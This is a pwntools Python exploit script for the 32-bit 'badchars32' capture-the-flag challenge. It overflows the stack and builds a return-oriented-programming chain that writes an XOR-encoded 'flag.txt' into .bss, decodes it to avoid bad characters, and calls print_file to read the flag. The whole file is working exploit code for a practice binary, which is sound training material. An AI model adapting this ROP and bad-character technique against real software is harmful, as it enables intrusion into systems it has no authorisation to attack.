#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template badchars32
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('badchars32')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     i386-32-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x8048000)
# RUNPATH:  b'.'


print ('''\nusefulGadgets
#08048543 00 5d 00        ADD        byte ptr [EBP],BL
#08048546 c3              RET
#08048547 30 5d 00        XOR        byte ptr [EBP],BL
#0804854a c3              RET
#0804854b 28 5d 00        SUB        byte ptr [EBP],BL
#0804854e c3              RET
#0804854f 89 37           MOV        dword ptr [EDI],ESI
''' )


filename = './badchars32'
e = ELF(filename)
io=process(filename)

print("\nusefulGadgets: ")
print(e.disasm(0x8048547,3)+"\n")
xorbl     = p32(0x8048547)    # xor byte ptr [ebp], bl; ret;

print(e.disasm(0x804854f,2)+"\n")
movesi     = p32(0x804854f)    # mov dword ptr [edi], esi; ret;

print("\nRopper Gadgets: ")
print(e.disasm(0x80485bb,1)+"\n")
pop_ebp = p32(0x80485bb)    # pop ebp; ret;

print(e.disasm(0x804839d,1)+"\n")
pop_ebx = p32(0x804839d)    # pop ebx; ret;

print(e.disasm(0x80485b9,4)+"\n")
pop_esi_edi_ebp = p32(0x80485b9)    # pop esi; pop edi; pop ebp; ret;

print("\nwritable memory .bss: ")
bss = e.bss()
print(hex(e.bss()))

#prints address of some function()
#print(hex(e.['print_file'].address))


#
ctf_flag="flag.txt" 
badchars = ['x','g','a','.'] #no need to sort
indexes = []
for x in badchars:
    indexes.append(int(ctf_flag.index(x)))
    

def xor_chars(index):
    rop = ROP(e)
    
    rop.raw(pop_ebp)
    rop.raw(bss+index)
    rop.raw(pop_ebx)
    rop.raw(0x4)
    rop.raw(xorbl)
    
    return rop.chain()

def string_flag(string, index):
    size = 4
    rop = ROP(e)
    
    rop.raw(pop_esi_edi_ebp)
    rop.raw(string)
    rop.raw(p32(bss+(index*size)))
    rop.raw(b"A"*size)
    rop.raw(movesi)
    
    return rop.chain()

buf = b""
buf += cyclic(44)

buf += string_flag(b'flec',0)
buf += string_flag(b'*t|t',1)

for x in range(len(indexes)):
    buf += xor_chars(indexes[x])


_print_file = ROP(e)
_print_file.call('print_file', [bss])

buf += _print_file.chain()

#with open("tmp","w") as f:
    #f.write(payload)
    #f.close()

io.recvuntil('>')
io.sendline(buf)
io.recvuntil('!\n')
flag = io.recvline().decode().rstrip()
log.success("Flag: {}".format(flag))
